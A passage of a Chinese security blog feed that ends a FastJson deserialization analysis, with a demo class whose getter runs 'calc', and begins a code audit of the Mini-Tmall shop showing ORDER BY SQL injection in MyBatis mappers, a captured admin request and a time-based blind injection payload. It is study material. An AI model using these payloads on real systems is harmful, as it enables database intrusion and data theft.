src="/img/JavaFastJson/image-20250104191049113.png" alt="image-20250104191049113"></p><p>​这一步是获取键，然后再检测’:’判断传入的字符串是否合法。</p><p><img src="/img/JavaFastJson/image-20250104191612383.png" alt="image-20250104191612383"></p><p>​这一步功能是判断键是否为@type并通过scanSymbol获取类名，再通过loadClass加载类。</p><p><img src="/img/JavaFastJson/image-20250104192322790.png" alt="image-20250104192322790"></p><p>​这里的逻辑是，先判断类名是否为空长度是否为0，如果都满足就执行下面的逻辑，先从mappings中加载类，显然这里无法加载成功，再通过中括号判断是否是数组，这里显然也不是，<strong>再判断类名的首字母是否为L，尾字符是否为;，如果是就删除掉，再重新加载</strong>，这里画个小重点。</p><p><img src="/img/JavaFastJson/image-20250104193041690.png" alt="image-20250104193041690"></p><p>​这里判断了classLoader是否为null，这里为null所以就执行了这里的代码，调用了单参数loadClass，实际上就是将classloader修改为了false。</p><p><img src="/img/JavaFastJson/image-20250104193508416.png" alt="image-20250104193508416"></p><p>​重点再这一步走到contextClassLoader处，通过Thread.currentThread().getContextClassLoader()获取AppClassLoader。接着使用AppClassLoader来加载Student类，将它放到缓存里面，然后返回clazz。</p><p>​<img src="/img/JavaFastJson/image-20250104194317013.png" alt="image-20250104194317013"></p><p>​从这一步开始就开始了反序列化的过程，在此之前的操作都仅仅是对JSON字符串的操作。这里的size是放入的参数，我们追溯到这里为止还没有放入任何的参数，所以这里就size自然为0。这一步的重点是通过config.getDeserializer(clazz)获取反序列化器，然后使用这个反序列化器来反序列化。跟进<strong>getDeserializer</strong><img src="/img/JavaFastJson/image-20250104203136252.png" alt="image-20250104203136252">、</p><p>​这一步还是直接从缓存中获取User类，这里直接就获取到了，反序列化器不影响整体流程deserializer内部无法查看，不过不影响。这里由于直接从缓存中取出了类，所以这里中间一大段也就省略了。</p><p><img src="/img/JavaFastJson/image-20250104203946113.png" alt="image-20250104203946113"></p><p>​我们直接跟来到toJSON这个方法，这里是判断一下这个类是不是空、JSON类、Map类或者Collection，这里显然不是。</p><p><img src="/img/JavaFastJson/image-20250104204101501.png" alt="image-20250104204101501"></p><p>​如果都不是就判断是不是数字，是不是数组或者是不是原始类型，这里显然也不是。</p><p><img src="/img/JavaFastJson/image-20250104204613253.png" alt="image-20250104204613253"></p><p>​这一步先检查了一下反序列化器，不重要，重点在这一步。**javaBeanSerializer.getFieldValuesMap(javaObject);**我们继续追溯。</p><p><img src="/img/JavaFastJson/image-20250104204807226.png" alt="image-20250104204807226"></p><p>​可以看到这里循环遍历了对象所属类的getter。到这里我们已经成功的找到了调用了Java类中的getter方法的位置，而这里也就是FastJson产生反序列化漏洞的位置。而我们只需要简单修改一下我们之前所定义的类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;unser!!!&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这里我修改部分方法的代码，其中getName方法就是一个危险方法，我们再回到前端传入相同的参数，即可弹出计算机。</p><p><img src="/img/JavaFastJson/image-20250104205247702.png" alt="image-20250104205247702"></p><p>​可以看到，当代码经过这里之后就会弹出计算机。除此之外set方法也有一条路径，这里由于篇幅限制就不展开了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​FastJson在反序列化时，会通过键”@type”去寻找类，之后在反序列化的时候会自动的去调用getter方法和无参构造方法。</p><p>下面直接引用结论，Fastjson会对满足下列要求的setter&#x2F;getter方法进行调用：</p><p>满足条件的setter：</p><p>​<strong>非静态函数</strong><br>​<strong>返回类型为void或当前类</strong><br>​<strong>参数个数为1个</strong><br>满足条件的getter：</p><p>​<strong>非静态方法</strong><br>​<strong>无参数</strong><br>​<strong>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</strong></p><h2 id="FastJson漏洞原理及原理"><a href="#FastJson漏洞原理及原理" class="headerlink" title="FastJson漏洞原理及原理"></a>FastJson漏洞原理及原理</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>​由前面的审计过程我们知道，Fastjson是自己实现的一套序列化和反序列化机制，不是用的Java原生的序列化和反序列化机制。无论是哪个版本，Fastjson反序列化漏洞的原理都是一样的，只不过不同版本是针对不同的黑名单或者利用不同利用链来进行绕过利用而已。</p><h4 id="如何反序列化出恶意类？"><a href="#如何反序列化出恶意类？" class="headerlink" title="如何反序列化出恶意类？"></a>如何反序列化出恶意类？</h4><p>​由代码demo我们可知，parseObject()&#x2F;parse()在进行反序列化时，可通过键”@type”指定类型，若包含的类型太大，比如object或者Jsonobject就可以反序列化处任意类。例如代码写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> JSON.parseObject(poc,Object.class)</span><br></pre></td></tr></table></figure><p>就可以反序列化出Object类或其任意子类，而Object又是任意类的父类，所以就可以反序列化出所有类。</p><h4 id="如何通过反序列化利用恶意类触发恶意函数？"><a href="#如何通过反序列化利用恶意类触发恶意函数？" class="headerlink" title="如何通过反序列化利用恶意类触发恶意函数？"></a>如何通过反序列化利用恶意类触发恶意函数？</h4><p>​根据审计我们可知，FastJson的反序列化漏洞触发的效果将所有满足条件的setter、getter以及构造方法全部执行一遍，如果这三种方法中存在危险操作，就会导致反序列化漏洞。也就是说，该漏洞的前提是setter、getter以及构造方法中存在存在漏洞才能触发。比如我上面所提供的类中的getName方法。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[Java反序列化—Fastjson基础_java fastjson-CSDN博客](<a href="https://blog.csdn.net/qq_61237064/article/details/128579803?ops_request_misc=%7B%22request_id%22:%2208ab84ad2013fe9bdf7d95652b88da50%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=08ab84ad2013fe9bdf7d95652b88da50&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-128579803-null-null.142%5Ev101%5Epc_search_result_base6&utm_term=Java">https://blog.csdn.net/qq_61237064/article/details/128579803?ops_request_misc=%7B%22request%5Fid%22%3A%2208ab84ad2013fe9bdf7d95652b88da50%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=08ab84ad2013fe9bdf7d95652b88da50&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-128579803-null-null.142^v101^pc_search_result_base6&amp;utm_term=Java</a> FastJSON反序列化&amp;spm&#x3D;1018.2226.3001.4187)</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mini-Tmall</title>
      <link href="/2024/12/25/Mini-Tmall/"/>
      <url>/2024/12/25/Mini-Tmall/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>​迷你天猫商城是一个基于Spring Boot的综合性B2C电商平台，需求设计主要参考天猫商城的购物流程：用户从注册开始，到完成登录，浏览商品，加入购物车，进行下单，确认收货，评价等一系列操作。 作为迷你天猫商城的核心组成部分之一，天猫数据管理后台包含商品管理，订单管理，类别管理，用户管理和交易额统计等模块，实现了对整个商城的一站式管理和维护。</p><h2 id="项目依赖审计"><a href="#项目依赖审计" class="headerlink" title="项目依赖审计"></a>项目依赖审计</h2><p>​此maven项目的pom文件没有找到披露的漏洞，经过验证，工具所扫描出来的结果也是误报。</p><h2 id="单点漏洞审计"><a href="#单点漏洞审计" class="headerlink" title="单点漏洞审计"></a>单点漏洞审计</h2><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><p>​该项目所用的数据库交互以来为Mybatis，所以全局搜索$。</p><p><img src="/img/Mini-Tmall/image-20241224193427314.png" alt="image-20241224193427314"></p><p>​可见在mapper文件中存在多个疑似注入点，逐个审计。</p><h4 id="src-main-resources-mybatis-mapper-UserMapper-xml（成功）"><a href="#src-main-resources-mybatis-mapper-UserMapper-xml（成功）" class="headerlink" title="src&#x2F;main&#x2F;resources&#x2F;mybatis&#x2F;mapper&#x2F;UserMapper.xml（成功）"></a>src&#x2F;main&#x2F;resources&#x2F;mybatis&#x2F;mapper&#x2F;UserMapper.xml（成功）</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;select&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;userMap&quot;</span>&gt;</span></span><br><span class="line">    SELECT user_id,user_name,user_nickname,user_password,user_realname,user_gender,user_birthday,user_profile_picture_src,user_address,user_homeplace FROM user</span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;user != null&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;user.user_name != null&quot;</span>&gt;</span></span><br><span class="line">                (user_name LIKE concat(&#x27;%&#x27;,#&#123;user.user_name&#125;,&#x27;%&#x27;) or user_nickname LIKE concat(&#x27;%&#x27;,#&#123;user.user_name&#125;,&#x27;%&#x27;))</span><br><span class="line">            <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;user.user_gender != null&quot;</span>&gt;</span></span><br><span class="line">                and user_gender = #&#123;user.user_gender&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;orderUtil != null&quot;</span>&gt;</span></span><br><span class="line">        ORDER BY $&#123;orderUtil.orderBy&#125;<span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;orderUtil.isDesc&quot;</span>&gt;</span>desc <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;pageUtil != null&quot;</span>&gt;</span></span><br><span class="line">        LIMIT #&#123;pageUtil.pageStart&#125;,#&#123;pageUtil.count&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​注入参数为orderUtil下的orderBy参数，向上追溯。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//按条件查询用户-ajax</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;admin/user/&#123;index&#125;/&#123;count&#125;&quot;, method = RequestMethod.GET, produces = &quot;application/json;charset=UTF-8&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getUserBySearch</span><span class="params">(<span class="meta">@RequestParam(required = false)</span> String user_name<span class="comment">/* 用户名称 */</span>,</span></span><br><span class="line"><span class="params">                              <span class="meta">@RequestParam(required = false)</span> Byte[] user_gender_array<span class="comment">/* 用户性别数组 */</span>,</span></span><br><span class="line"><span class="params">                              <span class="meta">@RequestParam(required = false)</span> String orderBy<span class="comment">/* 排序字段 */</span>,</span></span><br><span class="line"><span class="params">                              <span class="meta">@RequestParam(required = false,defaultValue = &quot;true&quot;)</span> Boolean isDesc<span class="comment">/* 是否倒序 */</span>,</span></span><br><span class="line"><span class="params">                              <span class="meta">@PathVariable</span> Integer index<span class="comment">/* 页数 */</span>,</span></span><br><span class="line"><span class="params">                              <span class="meta">@PathVariable</span> Integer count<span class="comment">/* 行数 */</span>)</span> <span class="keyword">throws</span> UnsupportedEncodingException &#123;</span><br><span class="line">    <span class="comment">//移除不必要条件</span></span><br><span class="line">    <span class="type">Byte</span> <span class="variable">gender</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (user_gender_array != <span class="literal">null</span> &amp;&amp; user_gender_array.length == <span class="number">1</span>) &#123;</span><br><span class="line">        gender = user_gender_array[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (user_name != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">//如果为非空字符串则解决中文乱码：URLDecoder.decode(String,&quot;UTF-8&quot;);</span></span><br><span class="line">        user_name = <span class="string">&quot;&quot;</span>.equals(user_name) ? <span class="literal">null</span> : URLDecoder.decode(user_name, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (orderBy != <span class="literal">null</span> &amp;&amp; <span class="string">&quot;&quot;</span>.equals(orderBy)) &#123;</span><br><span class="line">        orderBy = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//封装查询条件</span></span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>()</span><br><span class="line">            .setUser_name(user_name)</span><br><span class="line">            .setUser_gender(gender);</span><br><span class="line"></span><br><span class="line">    <span class="type">OrderUtil</span> <span class="variable">orderUtil</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (orderBy != <span class="literal">null</span>) &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;根据&#123;&#125;排序，是否倒序:&#123;&#125;&quot;</span>,orderBy,isDesc);</span><br><span class="line">        orderUtil = <span class="keyword">new</span> <span class="title class_">OrderUtil</span>(orderBy, isDesc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">    logger.info(<span class="string">&quot;按条件获取第&#123;&#125;页的&#123;&#125;条用户&quot;</span>, index + <span class="number">1</span>, count);</span><br><span class="line">    <span class="type">PageUtil</span> <span class="variable">pageUtil</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PageUtil</span>(index, count);</span><br><span class="line">    List&lt;User&gt; userList = userService.getList(user, orderUtil, pageUtil);</span><br><span class="line">    object.put(<span class="string">&quot;userList&quot;</span>, JSONArray.parseArray(JSON.toJSONString(userList)));</span><br><span class="line">    logger.info(<span class="string">&quot;按条件获取用户总数量&quot;</span>);</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">userCount</span> <span class="operator">=</span> userService.getTotal(user);</span><br><span class="line">    object.put(<span class="string">&quot;userCount&quot;</span>, userCount);</span><br><span class="line">    logger.info(<span class="string">&quot;获取分页信息&quot;</span>);</span><br><span class="line">    pageUtil.setTotal(userCount);</span><br><span class="line">    object.put(<span class="string">&quot;totalPage&quot;</span>, pageUtil.getTotalPage());</span><br><span class="line">    object.put(<span class="string">&quot;pageUtil&quot;</span>, pageUtil);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object.toJSONString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​追溯到该控制器，使用了order功能，可见这里是没有过滤的，我们定位到前端的用户管理模块</p><p><img src="/img/Mini-Tmall/image-20241224194043898.png" alt="image-20241224194043898"></p><p>​抓包。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/tmall/admin/user/0/10?user_name=123&amp;user_gender_array=0&amp;user_gender_array=1&amp;orderBy=1&amp;isDesc=true</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.21.53.85:8080</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.21.53.85:8080/tmall/admin</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=3B16C09E8A179A970E83C60845A3ED95; username=1209577113; admin-token=1#2F31733671566670654C7A6C432B6766575978556E4E58456F4554656B56596479727567522B483048444B544C5A4F5332736C4673556352716E516573486D535366716C76524751733336462F746D77657036476C516F4C493741783532773834364D74783071516B5079657A6856355766355970547677473254736F2F5165454A656B366857734474653154734B672F494A4A33773D3D</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br></pre></td></tr></table></figure><p>​其中的注入点为orderBy参数，尝试注入。输入单引号后报错，尝试闭合，构造payload。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr((<span class="keyword">select</span><span class="operator">%</span><span class="number">20</span>database()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">0.1</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/Mini-Tmall/image-20241224205026604.png" alt="image-20241224205026604"></p><p>​导出数据后处理，得到库名：</p><p><img src="/img/Mini-Tmall/image-20241224205053441.png" alt="image-20241224205053441"></p><h4 id="src-main-resources-mybatis-mapper-RewardMapper-xml（成功）"><a href="#src-main-resources-mybatis-mapper-RewardMapper-xml（成功）" class="headerlink" title="src&#x2F;main&#x2F;resources&#x2F;mybatis&#x2F;mapper&#x2F;RewardMapper.xml（成功）"></a>src&#x2F;main&#x2F;resources&#x2F;mybatis&#x2F;mapper&#x2F;RewardMapper.xml（成功）</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;select&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;rewardMap&quot;</span>&gt;</span></span><br><span class="line">    SELECT</span><br><span class="line">        reward_id,</span><br><span class="line">        reward_name,</span><br><span class="line">        reward_content,</span><br><span class="line">        reward_createDate,</span><br><span class="line">        reward_user_id,</span><br><span class="line">        reward_state,</span><br><span class="line">        reward_amount</span><br><span class="line">    FROM reward</span><br><span class="line">    <span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;reward != null&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;reward.reward_name != null&quot;</span>&gt;</span>reward_name LIKE concat(&#x27;%&#x27;,#&#123;reward.reward_name&#125;,&#x27;%&#x27;)<span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;reward.reward_lowest_amount != null&quot;</span>&gt;</span>and reward_amount <span class="symbol">&amp;gt;</span>= #&#123;reward.reward_lowest_amount&#125;<span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;reward.reward_amount != null&quot;</span>&gt;</span>and reward_amount <span class="symbol">&amp;lt;</span>= #&#123;reward.reward_amount&#125;<span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;reward_isEnabled_array != null&quot;</span>&gt;</span></span><br><span class="line">            and reward_state IN</span><br><span class="line">            <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;reward_isEnabled_array&quot;</span> <span class="attr">index</span>=<span class="string">&quot;index&quot;</span> <span class="attr">item</span>=<span class="string">&quot;item&quot;</span> <span class="attr">open</span>=<span class="string">&quot;(&quot;</span> <span class="attr">separator</span>=<span class="string">&quot;,&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">close</span>=<span class="string">&quot;)&quot;</span>&gt;</span></span><br><span class="line">                #&#123;item&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;orderUtil != null&quot;</span>&gt;</span></span><br><span class="line">        ORDER BY $&#123;orderUtil.orderBy&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;orderUtil.isDesc&quot;</span>&gt;</span>desc<span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;pageUtil != null&quot;</span>&gt;</span></span><br><span class="line">        LIMIT #&#123;pageUtil.pageStart&#125;,#&#123;pageUtil.count&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​可见这里也是一样的注入点，向上追溯。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;admin/reward/&#123;index&#125;/&#123;count&#125;&quot;, method = RequestMethod.GET, produces = &quot;application/json;charset=utf-8&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getRewardBySearch</span><span class="params">(<span class="meta">@RequestParam(required = false)</span> String reward_name<span class="comment">/* 打赏人名称 */</span>,</span></span><br><span class="line"><span class="params">                                 <span class="meta">@RequestParam(required = false)</span> Double reward_lowest_amount<span class="comment">/* 打赏最低金额 */</span>,</span></span><br><span class="line"><span class="params">                                 <span class="meta">@RequestParam(required = false)</span> Double reward_highest_amount<span class="comment">/* 打赏最高金额 */</span>,</span></span><br><span class="line"><span class="params">                                 <span class="meta">@RequestParam(required = false)</span> Byte[] reward_isEnabled_array<span class="comment">/* 打赏状态数组 */</span>,</span></span><br><span class="line"><span class="params">                                 <span class="meta">@RequestParam(required = false)</span> String orderBy<span class="comment">/* 排序字段 */</span>,</span></span><br><span class="line"><span class="params">                                 <span class="meta">@RequestParam(required = false,defaultValue = &quot;true&quot;)</span> Boolean isDesc<span class="comment">/* 是否倒序 */</span>,</span></span><br><span class="line"><span class="params">                                 <span class="meta">@PathVariable</span> Integer index<span class="comment">/* 页数 */</span>,</span></span><br><span class="line"><span class="params">                                 <span class="meta">@PathVariable</span> Integer count<span class="comment">/* 行数 */</span>)</span> <span class="keyword">throws</span> UnsupportedEncodingException &#123;</span><br><span class="line">    <span class="comment">//移除不必要条件</span></span><br><span class="line">    <span 